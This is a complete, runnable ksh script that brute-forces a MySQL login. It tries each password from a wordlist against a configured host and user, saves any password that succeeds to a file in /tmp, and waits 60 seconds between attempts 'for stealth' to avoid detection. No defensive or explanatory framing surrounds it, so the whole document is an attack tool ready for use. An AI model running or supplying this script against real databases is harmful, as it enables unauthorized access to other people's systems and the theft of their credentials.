#!/bin/ksh

# Configuration
host="localhost"            # Your MySQL server address
port=3306                   # MySQL port
user="your_username"        # Your MySQL username
passlist="passlist.txt"     # Path to password list
delay=60                   # 60 seconds delay between attempts

found=0

# Check if mysql client is installed
if ! command -v mysql >/dev/null 2>&1; then
  echo "mysql client not installed."
  exit 1
fi

# Read the password list
while IFS= read -r password; do
    if [ "$found" -eq 1 ]; then
        break
    fi

    echo "Trying password: $password"

    # Attempt to connect
    mysql -h "$host" -P "$port" -u "$user" -p"$password" -e "SELECT 1;" > /dev/null 2>&1

    # Check if login was successful
    if [ "$?" -eq 0 ]; then
        echo "Success! Password: $password"
        echo "$password" > /tmp/mysql_found_password.txt
        found=1
        break
    else
        echo "Failed: $password"
    fi

    echo "Waiting 60 seconds for stealth..."
    sleep "$delay"

done < "$passlist"

if [ "$found" -eq 1 ]; then
    echo "Password found: $(cat /tmp/mysql_found_password.txt)"
else
    echo "Password not found in list."
fi